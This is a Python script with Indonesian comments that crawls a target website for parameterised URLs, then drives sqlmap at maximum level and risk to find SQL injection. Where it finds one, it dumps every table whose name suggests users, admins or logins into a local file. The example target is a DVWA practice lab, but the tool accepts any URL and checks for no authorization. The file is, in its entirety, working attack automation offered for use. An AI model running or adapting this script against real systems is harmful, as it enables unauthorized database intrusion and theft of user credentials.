import requests
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import subprocess
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
import os

# Konfigurasi
CRAWL_LIMIT = 100
MAX_THREADS = 10
SQLMAP_PATH = "sqlmap"  # Pastikan sqlmap ada di PATH
TARGET_KEYWORDS = ["user", "admin", "login"]  # Tabel yang akan didump

VISITED = set()
URLS_WITH_PARAMS = []

def crawl(url, target_domain):
    """Merayapi URL dan mencari parameter GET"""
    if len(VISITED) >= CRAWL_LIMIT or url in VISITED:
        return
    try:
        response = requests.get(url, timeout=5)
    except:
        return

    VISITED.add(url)
    print(f"[Crawl] {url}")

    soup = BeautifulSoup(response.text, "html.parser")
    for link_tag in soup.find_all("a", href=True):
        link = urljoin(url, link_tag["href"])
        parsed = urlparse(link)

        if target_domain in link and link not in VISITED:
            if parsed.query:
                URLS_WITH_PARAMS.append(link)
            crawl(link, target_domain)

def test_sqlmap(url):
    """Menguji URL dengan SQLMap"""
    print(f"\n[+] Menguji kerentanan SQLi: {url}")
    check_cmd = [
        SQLMAP_PATH, "-u", url, "--batch", "--level=5", "--risk=3", "--random-agent"
    ]
    result = subprocess.run(check_cmd, capture_output=True, text=True)

    if re.search(r"the back-end DBMS", result.stdout, re.IGNORECASE):
        print(f"[!!!] Rentan SQLi ditemukan: {url}")
        run_targeted_dump(url)
    else:
        print(f"[-] Tidak rentan: {url}")

def run_targeted_dump(url):
    """Cari DB, tabel sesuai keyword, lalu dump"""
    print("[*] Mencari database...")
    dbs_cmd = [SQLMAP_PATH, "-u", url, "--batch", "--level=5", "--risk=3", "--threads=10", "--dbs"]
    dbs_result = subprocess.run(dbs_cmd, capture_output=True, text=True)
    databases = re.findall(r"\[\*\] (.+)", dbs_result.stdout)

    if not databases:
        print("[!] Tidak ada database ditemukan.")
        return

    output_file = f"hasil_dump_{urlparse(url).netloc}.txt"
    with open(output_file, "a", encoding="utf-8") as f:
        for db in databases:
            print(f"[DB] {db}")
            print(f"[*] Mencari tabel di {db}...")
            tables_cmd = [SQLMAP_PATH, "-u", url, "--batch", "--level=5", "--risk=3", "--threads=10", "-D", db, "--tables"]
            tables_result = subprocess.run(tables_cmd, capture_output=True, text=True)
            tables = re.findall(r"\|\s*(\w+)\s*\|", tables_result.stdout)

            for table in tables:
                if any(keyword.lower() in table.lower() for keyword in TARGET_KEYWORDS):
                    print(f"[Dump] {db}.{table}")
                    dump_cmd = [
                        SQLMAP_PATH, "-u", url, "--batch", "--level=5", "--risk=3",
                        "--threads=10", "-D", db, "-T", table, "--dump"
                    ]
                    dump_result = subprocess.run(dump_cmd, capture_output=True, text=True)
                    print(dump_result.stdout)
                    f.write(dump_result.stdout + "\n")

if __name__ == "__main__":
    TARGET = input("Masukkan URL target (contoh: http://localhost/dvwa/): ").strip()
    if not TARGET.startswith("http"):
        print("[!] URL harus diawali http:// atau https://")
        exit()

    TARGET_DOMAIN = urlparse(TARGET).netloc

    print("[*] Mulai crawling...")
    crawl(TARGET, TARGET_DOMAIN)

    print(f"\n[!] Total URL dengan parameter ditemukan: {len(URLS_WITH_PARAMS)}")

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = [executor.submit(test_sqlmap, url) for url in URLS_WITH_PARAMS]
        for future in as_completed(futures):
            future.result()

    print("\n[✓] Proses selesai. Hasil tersimpan di file.")
